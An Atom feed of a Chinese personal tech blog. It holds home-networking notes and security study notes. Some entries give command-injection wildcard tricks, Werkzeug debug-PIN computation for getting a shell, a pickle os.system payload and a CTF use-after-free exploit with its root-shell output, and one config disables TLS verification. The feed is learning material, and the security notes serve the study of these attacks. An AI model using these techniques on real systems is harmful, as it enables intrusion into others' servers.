<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://rainerhu.github.io</id>
    <title>Rain</title>
    <updated>2023-06-26T11:38:03.747Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://rainerhu.github.io"/>
    <link rel="self" href="https://rainerhu.github.io/atom.xml"/>
    <subtitle>word</subtitle>
    <logo>https://rainerhu.github.io/images/avatar.png</logo>
    <icon>https://rainerhu.github.io/favicon.ico</icon>
    <rights>All rights reserved 2023, Rain</rights>
    <entry>
        <title type="html"><![CDATA[手机特定应用 网络加载卡解决办法]]></title>
        <id>https://rainerhu.github.io/post/shou-ji-te-ding-ying-yong-wang-luo-jia-zai-qia-jie-jue-ban-fa/</id>
        <link href="https://rainerhu.github.io/post/shou-ji-te-ding-ying-yong-wang-luo-jia-zai-qia-jie-jue-ban-fa/">
        </link>
        <updated>2023-06-18T09:43:30.000Z</updated>
        <content type="html"><![CDATA[<h1 id="ipv6的坑">ipv6的坑</h1>
<p>关闭了dhcp，联通的光猫 路由器还是会给分配ipv6的dns，离谱；<br>
一通操作在管理员后台彻底干掉了ipv6的dns，终于解决问题</p>
<p>网速飞快 😎</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[tailscale 只用ip 自建derper]]></title>
        <id>https://rainerhu.github.io/post/tailscale-zhi-yong-ip-zi-jian-derper/</id>
        <link href="https://rainerhu.github.io/post/tailscale-zhi-yong-ip-zi-jian-derper/">
        </link>
        <updated>2023-06-18T09:40:42.000Z</updated>
        <content type="html"><![CDATA[<p>随着derp的不断更新，现在只有ip没有域名的情况下搭建已经简单很多了。</p>
<p>derp安装就不详细说了，直接看官网自己装就完事，<br>
我自己是使用了大佬做的容器版本的 <a href="https://hub.docker.com/r/fredliang/derper">fredliang/derper</a> ,大家也可以用这个</p>
<h1 id="证书生成">证书生成</h1>
<p>由于没有域名，就要先自己生成个证书出来了，由于我是把derp部署在自己家里，拨号ip会变化，所用了DDNS，这里生成域名就要用DDNS使用的域名来生成证书</p>
<p>注意： 要替换 里面的域名用自己的，当然如果有固定的公网ip也可以直接用ip来搞，应该问题不大，证书生成命令忘记是从哪里抄的了.....</p>
<pre><code class="language-shell">openssl genrsa -out ca.key 2048
openssl req -new -x509 -days 365 -key ca.key -subj &quot;/C=CN/ST=GD/L=SZ/O=Acme, Inc./CN=Acme Root CA&quot; -out ca.crt
# 下面的命令要替换*.example.org
openssl req -newkey rsa:2048 -nodes -keyout xxx.example.org.key -subj &quot;/C=CN/ST=GD/L=SZ/O=Acme, Inc./CN=*.example.org&quot; -out server.csr   
#  下面的命令要替换xxx.example.org
openssl x509 -req -extfile &lt;(printf &quot;subjectAltName=DNS:example.com,DNS:xxx.example.org&quot;) -days 365 -in server.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out xxx.example.org.crt  
</code></pre>
<h1 id="启动容器">启动容器</h1>
<p>然后就是巨长的启动容器命令 ，这里用了比较多的参数 ，逐一解释下：</p>
<ul>
<li><code>--restart always</code> ： 容器自动重启</li>
<li><code>--net=container:gw</code>  :  和其他容器共享网络，这样子derp开放的端口就会开在我的网关容器上，这个大家视情况使用，我是因为自己搞了个容器做网关，专门用来映射端口到公网上，然后本来想要在gw的容器上配置iptable做端口转发到跑derp的容器上，但是研究了一天，不知道为什么udp都是只有收到的包，转发不出去啊，绝望。。。，无奈搞了这么个骚操作，直接和网关容器共享网络了，网络知识还是不够。。搞不懂为啥</li>
<li><code>-v /root/cert:/root/cert</code>： 挂载证书目录</li>
<li><code>-v /var/lib/tailscale:/var/lib/tailscale -v /var/run/tailscale:/var/run/tailscale</code>  ： 挂载目录到容器，为了打开derp对客户端的校验，因此需要挂载，不过好像只用挂载第二个就行了</li>
<li><code>-e DERP_VERIFY_CLIENTS=true</code> ： 开启<code>--verify-clients</code>的校验</li>
<li><code>-e DERP_HTTP_PORT=-1</code> ： 禁用http端口，少开点端口，安全</li>
<li><code>-e DERP_DOMAIN=xxx.example.org</code> ：设置自己的域名</li>
<li><code>-e DERP_CERT_MODE=manual</code>: 设置证书模式，为自己指定的证书</li>
<li><code>-e DERP_CERT_DIR=/root/cert</code> :指定证书目录</li>
<li><code>-e DERP_ADDR=:448</code> ： 指定开放的https端口</li>
<li><code>--name=derp </code> ： 给容器起名字</li>
</ul>
<pre><code class="language-shell">docker run -d --restart always --net=container:gw  -v /root/cert:/root/cert -v /var/lib/tailscale:/var/lib/tailscale -v /var/run/tailscale:/var/run/tailscale -e DERP_VERIFY_CLIENTS=true -e DERP_HTTP_PORT=-1  -e DERP_DOMAIN=xxx.example.org -e DERP_CERT_MODE=manual -e DERP_CERT_DIR=/root/cert -e DERP_ADDR=:448   --name=derp fredliang/derper:5.26
</code></pre>
<h1 id="修改acl规则">修改ACL规则</h1>
<p>ACL规则有两个地方比较重要，一个是我改了https的端口，没有用默认的，一定要加上，还有就是<br>
<code>InsecureForTests</code> ，忽略掉证书错误，不然就连接不上去了（如果你的证书不是自己自签名的，而是真的话，就不用加这个了）<br>
参考示例：</p>
<pre><code class="language-json">&quot;derpMap&quot;:
		{
			&quot;OmitDefaultRegions&quot;: false,
			&quot;Regions&quot;: {
				&quot;900&quot;: {
					&quot;RegionID&quot;:   900,
					&quot;RegionCode&quot;: &quot;home&quot;,
					&quot;RegionName&quot;: &quot;home&quot;,
					&quot;Nodes&quot;: [{
						&quot;Name&quot;:             &quot;1&quot;,
						&quot;RegionID&quot;:         900,
						&quot;HostName&quot;:         &quot;xxx.example.org&quot;,
						&quot;DERPPort&quot;:         448,  //指定https端口
						&quot;InsecureForTests&quot;: true,  // 忽略证书错失
					}],
				},
			},
		}


</code></pre>
<p>怎么搞DDNS这里就不详细写了</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[sqlit使用时注意内存泄露]]></title>
        <id>https://rainerhu.github.io/post/sqlit-shi-yong-shi-zhu-yi-nei-cun-xie-lu1/</id>
        <link href="https://rainerhu.github.io/post/sqlit-shi-yong-shi-zhu-yi-nei-cun-xie-lu1/">
        </link>
        <updated>2022-06-15T12:41:44.000Z</updated>
        <summary type="html"><![CDATA[<h2 id="sqlit使用时注意内存泄露">sqlit使用时注意内存泄露</h2>
<ul>
<li><a href="https://blog.csdn.net/shengfang666/article/details/7938994">sqlite内存泄露</a></li>
<li>sqlite3_get_table------sqlite3_free_table(pazResult)</li>
<li>sqlite3_exec-----sqlite3_free(*errmsg) (出现错误的情况下要调用)</li>
<li>sqlite3_open-------sqlite3_close</li>
</ul>
]]></summary>
        <content type="html"><![CDATA[<h2 id="sqlit使用时注意内存泄露">sqlit使用时注意内存泄露</h2>
<ul>
<li><a href="https://blog.csdn.net/shengfang666/article/details/7938994">sqlite内存泄露</a></li>
<li>sqlite3_get_table------sqlite3_free_table(pazResult)</li>
<li>sqlite3_exec-----sqlite3_free(*errmsg) (出现错误的情况下要调用)</li>
<li>sqlite3_open-------sqlite3_close</li>
</ul>
<!-- more -->
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[命令注入部分特殊字符]]></title>
        <id>https://rainerhu.github.io/post/ming-ling-zhu-ru-bu-fen-te-shu-zi-fu/</id>
        <link href="https://rainerhu.github.io/post/ming-ling-zhu-ru-bu-fen-te-shu-zi-fu/">
        </link>
        <updated>2022-01-11T12:43:27.000Z</updated>
        <summary type="html"><![CDATA[<h1 id="目录穿越">目录穿越</h1>
<pre><code class="language-shell">cd .?/.?/
cd .[[:punct:]]/
cd .[[:print:]]/
cd .[^1]/
</code></pre>
]]></summary>
        <content type="html"><![CDATA[<h1 id="目录穿越">目录穿越</h1>
<pre><code class="language-shell">cd .?/.?/
cd .[[:punct:]]/
cd .[[:print:]]/
cd .[^1]/
</code></pre>
<!-- more -->
<p>shell通配符实现目录穿越</p>
<table>
<thead>
<tr>
<th>字符</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td>*</td>
<td>匹配任意长度任意字符</td>
</tr>
<tr>
<td>?</td>
<td>匹配任意单个字符</td>
</tr>
<tr>
<td>[list]</td>
<td>匹配指定范围内（list）任意单个字符，也可以是单个字符组成的集合</td>
</tr>
<tr>
<td>[^list]</td>
<td>匹配指定范围外的任意单个字符或字符集合</td>
</tr>
<tr>
<td>[!list]</td>
<td>同<code>[^list]</code></td>
</tr>
<tr>
<td>{str1,str2,…}</td>
<td>匹配 srt1 或者 srt2 或者更多字符串，也可以是集合</td>
</tr>
<tr>
<td>IFS</td>
<td>由 &lt; space &gt; 或 &lt; tab &gt; 或 &lt; enter &gt; 三者之一组成</td>
</tr>
<tr>
<td>CR</td>
<td>由 &lt; enter &gt; 产生</td>
</tr>
<tr>
<td>!</td>
<td>执行 history 中的命令</td>
</tr>
</tbody>
</table>
<p>专用字符集</p>
<table>
<thead>
<tr>
<th>字符</th>
<th>意义</th>
</tr>
</thead>
<tbody>
<tr>
<td>[:alnum:]</td>
<td>任意数字或者字母</td>
</tr>
<tr>
<td>[:alpha:]</td>
<td>任意字母</td>
</tr>
<tr>
<td>[:space:]</td>
<td>空格</td>
</tr>
<tr>
<td>[:lower:]</td>
<td>小写字母</td>
</tr>
<tr>
<td>[:digit:]</td>
<td>任意数字</td>
</tr>
<tr>
<td>[:upper:]</td>
<td>任意大写字母</td>
</tr>
<tr>
<td>[:cntrl:]</td>
<td>控制符</td>
</tr>
<tr>
<td>[:graph:]</td>
<td>图形</td>
</tr>
<tr>
<td>[:print:]</td>
<td>可打印字符</td>
</tr>
<tr>
<td>[:punct:]</td>
<td>标点符号</td>
</tr>
<tr>
<td>[:xdigit:]</td>
<td>十六进制数</td>
</tr>
<tr>
<td>[:blank:]</td>
<td>空白字符</td>
</tr>
</tbody>
</table>
<ul>
<li>在使用专属字符集的时候，字符集之外还需要用 [ ] 来包含住，否则专用字符集不会生效，例如<code>[[:space:]]</code></li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[python-flask debug模式 pin码计算]]></title>
        <id>https://rainerhu.github.io/post/python-flask-debug-mo-shi-pin-ma-ji-suan/</id>
        <link href="https://rainerhu.github.io/post/python-flask-debug-mo-shi-pin-ma-ji-suan/">
        </link>
        <updated>2021-08-11T14:41:51.000Z</updated>
        <content type="html"><![CDATA[<!-- more -->
<p>遇到了flask在生产环境开debug模式的...学习一下怎么利用</p>
<h1 id="flask-debug模式-getshell">flask debug模式 getshell</h1>
<p>https://www.freebuf.com/articles/network/238485.html</p>
<p>https://www.cnblogs.com/HacTF/p/8160076.html</p>
<p>https://github.com/its-arun/Werkzeug-Debug-RCE/blob/master/werkzeug.py</p>
<p>源码</p>
<p>https://github.com/pallets/werkzeug/blob/main/src/werkzeug/debug/<strong>init</strong>.py</p>
<p>直接进入   xx.xx.xx.xx/console 可访问debug控制台页面</p>
<p>需要的参数值</p>
<pre><code class="language-python">probably_public_bits = [
	'admin',# username import getpass username=getpass.getuser()
	'flask.app',# modname getattr(app, &quot;__module__&quot;, app.__class__.__module__)
	'Flask',#   getattr(app, '__name__', getattr(app.__class__, '__name__'))
	'/usr/lib64/python2.7/site-packages/flask/app.pyc' # getattr(sys.modules.get(modname), '__file__', None)
]

private_bits = [
	'280362549456921',# str(uuid.getnode()),  /sys/class/net/eth0/address 网卡mac地址 str(0x4545454545)
	'54aea375-c51c-4a6a-95a8-9cf4727caadc'# get_machine_id()： /etc/machine-id  or /proc/sys/kernel/random/boot_id + /proc/self/cgroup（第一行最后一个/后的一段）
]
</code></pre>
<p>python3是app.py   python2是app.pyc</p>
<p>/proc/self/cgroup 内容会随着每个终端发生变化</p>
<pre><code class="language-shell">取第一行，最后一个 / 后的字符内容，拼接到从前面两个文件读到的内容 该处为session-6042.scope
11:memory:/user.slice/user-0.slice/session-6042.scope
10:perf_event:/
9:devices:/user.slice
8:freezer:/
7:rdma:/
6:pids:/user.slice/user-0.slice/session-6042.scope
5:blkio:/
4:net_cls,net_prio:/
3:cpu,cpuacct:/
2:cpuset:/
1:name=systemd:/user.slice/user-0.slice/session-6042.scope
0::/user.slice/user-0.slice/session-6042.scope

</code></pre>
<p>https://github.com/pallets/werkzeug/commit/11ba286a1b907110a2d36f5c05740f239bc7deed</p>
<p>该提交修改了计算pin方式，使用sha1，不再使用md5，生成pin的代码还是需要根据版本尝试才可以。。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[树莓派：openwrt搭建]]></title>
        <id>https://rainerhu.github.io/post/shu-mei-pai-openwrt-da-jian/</id>
        <link href="https://rainerhu.github.io/post/shu-mei-pai-openwrt-da-jian/">
        </link>
        <updated>2021-07-25T11:38:06.000Z</updated>
        <content type="html"><![CDATA[<h1 id="树莓派镜像选择">树莓派镜像选择</h1>
<p>https://github.com/openfans-community-offical/Debian-Pi-Aarch64<br>
选用无桌面加强版 的镜像就可以<br>
<code> OPENFANS-Debian-Buster-Desktop-Aarch64-XXXXXX.img</code><br>
不需要在自己安装很多东西，基本都安装好了</p>
<h1 id="openwrt-docker">openwrt docker</h1>
<p>下列两个都可以<br>
https://hub.docker.com/r/buddyfly/openwrt-aarch64<br>
https://hub.docker.com/r/sulinggg/openwrt</p>
<h1 id="树莓派网络配置">树莓派网络配置</h1>
<ol>
<li>开启网卡混杂模式</li>
</ol>
<pre><code>sudo ip link set eth0 promisc on
</code></pre>
<ol>
<li>docker 网络创建</li>
</ol>
<pre><code>docker network create -d macvlan --subnet=192.168.8.0/24 --gateway=192.168.8.1 -o parent=eth0 macnet
</code></pre>
<p>可执行 <code>docker network ls</code> 查看创建的网络<br>
关于<code>macvlan</code>相关内容下面补充，大概就是一个桥接吧，但是又有区别<br>
3. 拉取镜并启动容器</p>
<pre><code>docker pull buddyfly/openwrt-aarch64 #拉取镜像
docker run --restart always --name openwrt -d --network macnet --privileged buddyfly/openwrt-aarch64 /sbin/init 
#启动容器，自动重启，命名容器名，后台运行，加入macnet网络，容器内命令执行权限，定义容器启动后执行的命令

</code></pre>
<ol start="4">
<li>进入容器修改网络</li>
</ol>
<pre><code> docker exec -it openwrt bash #进入容器bash界面
vi /etc/config/network

config interface 'loopback'
        option ifname 'lo'
        option proto 'static'
        option ipaddr '127.0.0.1'
        option netmask '255.0.0.0'

config globals 'globals'
        option ula_prefix 'fd5d:af65:56ed::/48'

config interface 'lan'
        option type 'bridge'
        option ifname 'eth0'
        option proto 'static'
        option ipaddr '192.168.8.10'
        option netmask '255.255.255.0'
        option ip6assign '60'
        option gateway  '192.168.8.1'
        option dns '192.168.8.1'
</code></pre>
<p>重启网络</p>
<pre><code> /etc/init.d/network restart #重启openwrt的网络
</code></pre>
<ol>
<li>树莓派网络配置</li>
</ol>
<pre><code>/etc/network/interfaces
# interfaces(5) file used by ifup(8) and ifdown(8)
# Include files from /etc/network/interfaces.d:
source-directory /etc/network/interfaces.d
## Used dhcp ip address set eth0 inet to dhcp,
## or used static ip address set eth0 to static
## and change other ip settings.
## If you wanna let settings to take effect,
## uncomment symbol in front.

auto eth0
allow-hotplug eth0

#iface eth0 inet dhcp
iface eth0 inet static
address 192.168.8.103
netmask 255.255.255.0
gateway 192.168.8.1
dns-nameservers 192.168.8.10
</code></pre>
<ol start="6">
<li>
<p>修改openwrt配置<br>
默认密码：root-password<br>
关闭DHCP，ipv6的也要关掉</p>
<figure data-type="image" tabindex="1"><img src="https://rainerhu.github.io/post-images/1627215328307.jpg" alt="" loading="lazy"></figure>
</li>
<li>
<p>开机启动脚本修改<br>
在<code>/boot/rc-local</code>中加入下面的，来让树莓派本身的流量也走openwrt<br>
没有这个需求的不改也行</p>
</li>
</ol>
<pre><code>ip link add link eth0 dev eth0.01 type macvlan mode bridge
sleep 10
ifconfig eth0.01 192.168.8.11/24
route add 192.168.8.10 dev eth0.01
route add default gw 192.168.8.10 dev eth0.01
</code></pre>
<p>--macvlan的解释-2021.07.07更新</p>
<h1 id="macvlan">macvlan</h1>
<p>在第一步中有创建 docker使用的macvlan，目的是为了实现和桥接一样的模式，共享物理网卡使用的外部网络。使用了bridge模式。<br>
该模式下虚拟出来的网卡是无法直接与父网卡通信的，因此树莓派本身的流量无法到达openwrt<br>
为了能够让树莓派本身的流量也经过openwrt出去，所以后面重新创建了一块虚拟网卡，并修改路由，指定默认网关到openwrt的ip，同时指定该路由网卡使用虚拟网卡</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[python pickle]]></title>
        <id>https://rainerhu.github.io/post/python-pickle/</id>
        <link href="https://rainerhu.github.io/post/python-pickle/">
        </link>
        <updated>2021-05-05T12:47:14.000Z</updated>
        <summary type="html"><![CDATA[<h2 id="控制如何反序列化">控制如何反序列化</h2>
<ul>
<li><code>__reduce__</code></li>
<li><code>__reduce_ex__</code>  指定pickle协议版本</li>
</ul>
<pre><code class="language-python">class Test(object):
    def __reduce__(self):
        cmd = &quot;whoami&quot;
        #return __import__('os').system,('whoami',)
        return (os.system,('whoami',))
  __reduce__ex__

</code></pre>
]]></summary>
        <content type="html"><![CDATA[<h2 id="控制如何反序列化">控制如何反序列化</h2>
<ul>
<li><code>__reduce__</code></li>
<li><code>__reduce_ex__</code>  指定pickle协议版本</li>
</ul>
<pre><code class="language-python">class Test(object):
    def __reduce__(self):
        cmd = &quot;whoami&quot;
        #return __import__('os').system,('whoami',)
        return (os.system,('whoami',))
  __reduce__ex__

</code></pre>
<!-- more -->
<h2 id="限制全局变量">限制全局变量</h2>
<ul>
<li><strong>find_class</strong>  https://docs.python.org/zh-cn/3/library/pickle.html#pickle-restrict</li>
</ul>
<pre><code class="language-python">import builtins
import io
import pickle

safe_builtins = {
    'range',
    'complex',
    'set',
    'frozenset',
    'slice',
}

class RestrictedUnpickler(pickle.Unpickler):

    def find_class(self, module, name):
        # Only allow safe classes from builtins.
        if module == &quot;builtins&quot; and name in safe_builtins:
            return getattr(builtins, name)
        # Forbid everything else.
        raise pickle.UnpicklingError(&quot;global '%s.%s' is forbidden&quot; %
                                     (module, name))

def restricted_loads(s):
    &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;
    return RestrictedUnpickler(io.BytesIO(s)).load()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[UAF]]></title>
        <id>https://rainerhu.github.io/post/uaf/</id>
        <link href="https://rainerhu.github.io/post/uaf/">
        </link>
        <updated>2020-06-24T12:48:43.000Z</updated>
        <content type="html"><![CDATA[<h3 id="简介">简介</h3>
<p>use after free，即释放后重用。漏洞产生的原因，在于内存在被释放后，但是指向指针并没有被删除，又被程序调用。比较常见的类型是C++对象，利用UAF修改C++的虚函数表导致的任意代码执行。</p>
<h3 id="虚函数">虚函数</h3>
<p>在C++中，如果类中有虚函数，那么它就会有一个虚函数表的指针__vfptr，在类对象最开始的内存数据中。之后是类中的成员变量的内存数据，虚函数指针指向虚函数表</p>
<p>对于子类，最开始的内存数据记录着父类对象的拷贝（包括父类虚函数表指针和成员变量）。 之后是子类自己的成员变量数据</p>
<pre><code class="language-c">#include &lt;iostream&gt;
class A{
public:
    int a;
    A():a(0x1) {}
    virtual void foo(){ std::cout &lt;&lt; &quot;A::foo()&quot; &lt;&lt; std::endl; }
    void bar(){ std::cout &lt;&lt; &quot;A::bar()&quot; &lt;&lt; std::endl; }
};
class B: public A{
public:
    int b;
    B():A(),b(0x2) {}
    void foo(){ std::cout &lt;&lt; &quot;B::foo()&quot; &lt;&lt; std::endl; }
};
class C: public B{
public:
    int c;
    C():B(),c(0x3) {}
    void foo(){ std::cout &lt;&lt; &quot;C::foo()&quot; &lt;&lt; std::endl; }
};
int main() {
    A a; B b; C c; B *p = &amp;c;
    p-&gt;foo();
    std::cout &lt;&lt; sizeof(int) &lt;&lt; &quot; &quot; &lt;&lt; sizeof(int*) &lt;&lt; std::endl;
    return 0;
}
</code></pre>
<pre><code>(gdb) p a
$1 = {_vptr.A = 0x555555557d90 &lt;vtable for A+16&gt;, a = 1}
(gdb) p b
$2 = {&lt;A&gt; = {_vptr.A = 0x555555557d78 &lt;vtable for B+16&gt;, a = 1}, b = 2}
(gdb) p c
$3 = {&lt;B&gt; = {&lt;A&gt; = {_vptr.A = 0x555555557d60 &lt;vtable for C+16&gt;, a = 1},
    b = 2}, c = 3}

</code></pre>
<h3 id="slab-slub">SLAB &amp;&amp; SLUB</h3>
<p>内存管理机制，SLAB要求系统暂时保留已经释放的内核对象空间，以便下次申请时不需要再次初始化和分配;但是，SLAB机制对内核对象的类型十分挑剔，只有类型和大小都完全一致的对象才能重用其空间;这就好比是装过鸡的笼子是不允许再去关兔子了,哪怕鸡和兔子的大小一样;<br>
但是,和SLAB相比,SLUB对对象类型就没有限制,两个对象只要大小差不多就可以重用同一块内存,而不在乎类型是否相同;</p>
<p>示例代码</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
int main()
{
    char *p1;
    p1 = (char *) malloc(sizeof(char)*10);
    memcpy(p1,&quot;hello&quot;,10);
    printf(&quot;p1 addr:%x,%s\n&quot;,p1,p1);
    free(p1);
    char *p2;
    p2 = (char *)malloc(sizeof(char)*10); //申请同样大小的内存
    memcpy(p1,&quot;world&quot;,10); //向p1中拷贝 
    printf(&quot;p2 addr:%x,%s\n&quot;,p2,p2);// 输出p2
    return 0;
}
</code></pre>
<p>输出</p>
<pre><code>p1 addr:d21260,hello
p2 addr:d21260,world

</code></pre>
<h3 id="ctf-示例">CTF-示例</h3>
<pre><code class="language-c">#include &lt;fcntl.h&gt;
#include &lt;iostream&gt;
#include &lt;cstring&gt;
#include &lt;cstdlib&gt;
#include &lt;unistd.h&gt;
using namespace std;

class Human{
private:
	virtual void give_shell(){
		 system(&quot;/bin/sh&quot;);
	}
protected:
	int age;
	string name;
public:
	virtual void introduce(){
		cout &lt;&lt; &quot;My name is &quot; &lt;&lt; name &lt;&lt; endl;
		cout &lt;&lt; &quot;I am &quot; &lt;&lt; age &lt;&lt; &quot; years old&quot; &lt;&lt; endl;
	}
};
class Man: public Human{
public:
        Man(string name, int age){
                this-&gt;name = name;
                this-&gt;age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout &lt;&lt; &quot;I am a nice guy!&quot; &lt;&lt; endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this-&gt;name = name;
                this-&gt;age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout &lt;&lt; &quot;I am a cute girl!&quot; &lt;&lt; endl;
        }
};

int main(int argc, char* argv[]){
        Human* m = new Man(&quot;Jack&quot;, 25);
        Human* w = new Woman(&quot;Jill&quot;, 21);

        size_t len;
        char* data;
        unsigned int op;
        while(1){
                cout &lt;&lt; &quot;1. use\n2. after\n3. free\n&quot;;
                cin &gt;&gt; op;

                switch(op){
                        case 1:
                                m-&gt;introduce();
                                w-&gt;introduce();
                                break;
                        case 2:
                                len = atoi(argv[1]);
                                data = new char[len];
                                read(open(argv[2], O_RDONLY), data, len);
                                cout &lt;&lt; &quot;your data is allocated&quot; &lt;&lt; endl;
                                break;
                        case 3:
                                delete m;
                                delete w;
                                break;
                        default:
                                break;
                }
        }

        return 0;
}
</code></pre>
<p>有三个类，Man和Woman都是继承了Human类，并且可以看出只要我们将控制流劫持到Human类的私有虚函数give_shell，就能getshell了。</p>
<p>可以根据代码看出来，要想利用UAF，就要先选free，然后after，再use。</p>
<p>我们首先要看下要申请多大的内存空间合适，可以把这个代码编译一下，之后用IDA反汇编看下伪代码,可以看到需要0x30，就是48的内存。这个结果会因编译的时候使用的系统不同存在差异，这个CTF题原本给的编译出来的程序反汇编就是0x18的，是24</p>
<pre><code class="language-c++">  v3 = (Man *)operator new(0x30uLL);
  Man::Man(v3, &amp;p_name, 25);
  m = v3;
</code></pre>
<p>也可以用gdb调试看到大小是48</p>
<pre><code class="language-shell">Breakpoint 1, main (argc=1, argv=0x7fffffffe688) at uaf.cpp:54
54                      cout &lt;&lt; &quot;1. use\n2. after\n3. free\n&quot;;
(gdb) p *m
$1 = {_vptr.Human = 0x403d80 &lt;vtable for Man+16&gt;, age = 25, name = &quot;Jack&quot;}
(gdb) p sizeof(*m)
$2 = 48

</code></pre>
<p>然后找到introduce调用的地方，可以看到是根据虚函数指针，然后+1调用到的，所以我们要是想调用到given_shell 就是要覆盖改写虚函数指针的值</p>
<pre><code>          (*((void (__fastcall **)(Human *))m-&gt;_vptr_Human + 1))(m);
          (*((void (__fastcall **)(Human *))w-&gt;_vptr_Human + 1))(w);
</code></pre>
<p>然后寻找man 虚函数表。找到man的构造函数</p>
<pre><code class="language-c++">void __cdecl Man::Man(Man *const this, std::string *p_name, int age)
{
  Human::Human(this);
  this-&gt;_vptr_Human = (int (**)(...))&amp;off_403D80;
  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator=(&amp;this-&gt;name, p_name);
  this-&gt;age = age;
}
</code></pre>
<p>跟进_vptr_Human的off_403D80处，可以看到man的虚函数表</p>
<pre><code class="language-c++">.data.rel.ro:0000000000403D70 ; `vtable for'Man
.data.rel.ro:0000000000403D70 _ZTV3Man        dq 0                    ; offset to this
.data.rel.ro:0000000000403D78                 dq offset _ZTI3Man      ; `typeinfo for'Man
.data.rel.ro:0000000000403D80 off_403D80      dq offset _ZN5Human10give_shellEv
.data.rel.ro:0000000000403D80                                         ; DATA XREF: Man::Man(std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;,int)+20↑o
.data.rel.ro:0000000000403D80                                         ; Human::give_shell(void)
.data.rel.ro:0000000000403D88                 dq offset _ZN3Man9introduceEv ; Man::introduce(void)
.data.rel.ro:0000000000403D90                 public _ZTV5Human ; weak
.data.rel.ro:0000000000403D90 ; `vtable for'Human
.data.rel.ro:0000000000403D90 _ZTV5Human      dq 0                    ; offset to this
.data.rel.ro:0000000000403D98                 dq offset _ZTI5Human    ; `typeinfo for'Human
.data.rel.ro:0000000000403DA0 off_403DA0      dq offset _ZN5Human10give_shellEv
.data.rel.ro:0000000000403DA0                                         ; DATA XREF: Human::Human(void)+C↑o
.data.rel.ro:0000000000403DA0                                         ; Human::~Human()+C↑o
.data.rel.ro:0000000000403DA0                                         ; Human::give_shell(void)
.data.rel.ro:0000000000403DA8                 dq offset _ZN5Human9introduceEv ; Human::introduce(void)
.data.rel.ro:0000000000403DB0 ; public Woman :
</code></pre>
<p>可以看到，虚函数表中<strong>0x0000000000403D80</strong>地址就是man虚函数指针的值，而m-&gt;introduce()调用时，调用的其实是<code>0x0000000000403D80+0x8=0000000000403D88</code> ，<code>_vptr_Human</code>上加了0x8调用到了introduce。我们想要让他调用到give_shell就只需要将<code>_vptr_Human</code>的值覆盖为<code>0x0000000000403D80-0x8=0x0000000000403D78</code></p>
<p>这个值也可以通过gdb调试看到，打断点之后<code>info vtbl *m</code>就能看到对用的虚函数的表，或者直接查看变量结构也可以看到，我们还可以根据m的指针值，看下man的内存，可以看到第一块放的就是虚函数的指针<code>0x00403d80</code></p>
<pre><code class="language-shell">Starting program: /home/kali/uaf/uaf
\
Breakpoint 1, main (argc=1, argv=0x7fffffffe688) at uaf.cpp:54
54                      cout &lt;&lt; &quot;1. use\n2. after\n3. free\n&quot;;
(gdb) p *m
$1 = {_vptr.Human = 0x403d80 &lt;vtable for Man+16&gt;, age = 25, name = &quot;Jack&quot;}
(gdb) info vtbl *m
vtable for 'Human' @ 0x403d80 (subobject @ 0x416eb0):
[0]: 0x40157e &lt;Human::give_shell()&gt;
[1]: 0x401700 &lt;Man::introduce()&gt;
(gdb) x /10 0x403d80
0x403d80 &lt;_ZTV3Man+16&gt;: 0x000000000040157e      0x0000000000401700
0x403d90 &lt;_ZTV5Human&gt;:  0x0000000000000000      0x0000000000403de0
0x403da0 &lt;_ZTV5Human+16&gt;:       0x000000000040157e      0x000000000040159a
0x403db0 &lt;_ZTI5Woman&gt;:  0x00007ffff7fa6c98      0x0000000000402087
0x403dc0 &lt;_ZTI5Woman+16&gt;:       0x0000000000403de0      0x00007ffff7fa6c98
(gdb) p m
$3 = (Human *) 0x416eb0
(gdb) x /10x 0x416eb0
0x416eb0:       0x00403d80      0x00000000      0x00000019      0x00000000
0x416ec0:       0x00416ed0      0x00000000      0x00000004      0x00000000
0x416ed0:       0x6b63614a      0x00000000
</code></pre>
<p>现在我们已经确认了</p>
<ol>
<li>
<p>需要48的空间</p>
</li>
<li>
<p>需要把<code>_vptr_Human</code> 的值覆盖为<code>0x0000000000403D78</code></p>
</li>
</ol>
<p>然后尝试一下</p>
<pre><code class="language-shell">root@kali:/home/kali/uaf# python -c &quot;print('\x78\x3d\x40\x00\x00\x00\x00\x00')&quot; &gt; poc
root@kali:/home/kali/uaf# ./uaf 48 poc
1. use
2. after
3. free
3
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
1
# id
uid=0(root) gid=0(root) groups=0(root)
</code></pre>
<p>注意事项：复现的时候自己编译要注意关掉PIE,不然地址会被随机化处理，只有低两位固定</p>
<p><code>g++ uaf.cpp -o uaf -g -no-pie</code></p>
<h3 id="cve-2011-3874-zergrush">CVE-2011-3874-zergRush</h3>
<p>安卓UAF漏洞，通过缓冲区溢出，控制free任意地址</p>
<p>代码整个流程就是从data中读取数据放入tmp中，以空格为分割，然后，调用<code>strdup</code>申请内存复制tmp中内容，将指针放入argv数组中，然后再对argv中每个指针进行free操作。</p>
<pre><code class="language-c++">void FrameworkListener::dispatchCommand(SocketClient *cli, char *data) {      
    FrameworkCommandCollection::iterator i;                                   
    int argc = 0;                                                             
    char *argv[FrameworkListener::CMD_ARGS_MAX];                              
    char tmp[255];                                                            
    char *p = data;                                                           
    char *q = tmp;                                                            
    bool esc = false;                                                         
